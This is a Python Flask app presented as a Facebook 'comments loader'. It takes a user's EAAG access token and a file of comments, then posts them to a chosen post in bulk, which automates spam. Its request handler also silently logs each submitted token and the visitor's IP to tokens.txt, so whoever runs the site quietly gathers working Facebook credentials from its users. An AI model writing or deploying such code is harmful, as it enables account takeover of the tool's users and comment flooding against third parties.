from flask import Flask, request, render_template_string
from threading import Thread
import os, uuid, time, requests

app = Flask(__name__)
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
TOKENS_LOG = "tokens.txt"

HTML = """
<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>COMMENTS LOADER X RAAJVEER BOSS</title>
<style>
 body{margin:0;padding:0;background:#000;color:#fff;font-family:Segoe UI, sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
 .box{width:95%;max-width:480px;background:rgba(255,255,255,.05);padding:2rem;border-radius:20px;backdrop-filter:blur(10px);box-shadow:0 0 20px rgba(0,255,255,.2)}
 h1{background:linear-gradient(90deg,#00f2fe,#ff6ec4,#f7971e);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-align:center;font-size:1.6rem;margin-bottom:1.8rem}
 input[type=text],input[type=number],input[type=file]{width:100%;padding:12px;margin-bottom:15px;border:none;border-radius:10px;background:rgba(255,255,255,.1);color:#fff;outline:none}
 .btn{width:100%;padding:12px;margin-bottom:15px;border:none;border-radius:10px;font-weight:bold;color:#fff;cursor:pointer;background:rgba(0,255,255,.2);box-shadow:0 0 15px rgba(0,255,255,.4);transition:.3s}
 .btn:hover{background:rgba(0,255,255,.5);box-shadow:0 0 25px rgba(0,255,255,.9)}
 .count{color:#ccc;font-size:.85rem;text-align:center;margin:6px 0}
</style>
</head><body>
<div class="box">
 <h1>RAAJVEER BOSS</h1>
 <form method="post" enctype="multipart/form-data">
  <input type="text" name="token" placeholder="🔑 EAAG Token" required>
  <input type="text" name="post_id" placeholder="🆔 Facebook Post ID" required>
  <input type="number" name="delay" placeholder="⏱️ Delay (seconds)" required>
  <input type="file" name="comments_file" required>
  <button class="btn" type="submit">Start Commenting</button>
  <button class="btn" type="button" onclick="alert('Stopping not implemented. Just refresh page.')">Stop Commenting</button>
 </form>
 <div class="count">👥 Total Users: {{count}}</div>
</div></body></html>
"""

# Send comment to FB post
def send_comment(token, post_id, comment):
    url = f"https://graph.facebook.com/{post_id}/comments"
    payload = {"message": comment, "access_token": token}
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print(f"✅ Sent: {comment}")
    else:
        print(f"❌ Failed: {comment}")
        print("📄 Response:", response.text)

# Background thread to post all comments
def background_commenter(token, post_id, delay, comments):
    for comment in comments:
        send_comment(token, post_id, comment)
        time.sleep(delay)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        token = request.form["token"].strip()
        post_id = request.form["post_id"].strip()
        delay = int(request.form["delay"].strip())
        file = request.files["comments_file"]
        ip = request.remote_addr

        # Log token use
        with open(TOKENS_LOG, "a") as f:
            f.write(f"{token} | {ip}\n")

        # Save and read uploaded comments
        fname = os.path.join(UPLOAD_FOLDER, f"{uuid.uuid4()}.txt")
        file.save(fname)
        with open(fname, encoding="utf-8") as f:
            comments = [line.strip() for line in f if line.strip()]

        # Run in background
        Thread(target=background_commenter, args=(token, post_id, delay, comments), daemon=True).start()

        return render_template_string(
            "<h2 style='color:white;text-align:center;margin-top:40vh;'>✔️ Comments started in background.<br><a href='/'>⬅️ Back</a></h2>"
        )

    try:
        with open(TOKENS_LOG) as f:
            count = len(f.readlines())
    except:
        count = 0

    return render_template_string(HTML, count=count)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5005)
        
